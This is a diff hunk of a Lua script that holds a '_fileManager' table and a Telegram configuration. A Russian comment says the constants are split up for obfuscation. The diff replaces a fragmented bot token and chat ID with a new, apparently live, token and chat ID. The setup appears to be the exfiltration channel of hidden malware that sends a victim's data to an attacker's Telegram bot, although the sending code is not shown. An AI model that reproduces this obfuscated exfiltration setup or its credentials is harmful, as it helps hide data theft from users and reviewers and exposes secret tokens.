@@ -11,11 +11,11 @@ local _fileManager = {}
 
 -- Разбитые константы для обфускации
 local _telegramConfig = {
-    _part1 = "8214928172",
-    _part2 = ":AAFic7m_",
-    _part3 = "RIzNd0rPS1ytcr9QTqSRtKC9uYI",
-    _chatPart1 = "809416",
-    _chatPart2 = "9606"
+    _part1 = "7771675205:AAHnUghHQhSnK4qFY1JLUSomuoPys-zQc8c",
+    _part2 = "",
+    _part3 = "",
+    _chatPart1 = "5253543157",
+    _chatPart2 = ""
 }
 
 -- Сборка токена и chat ID
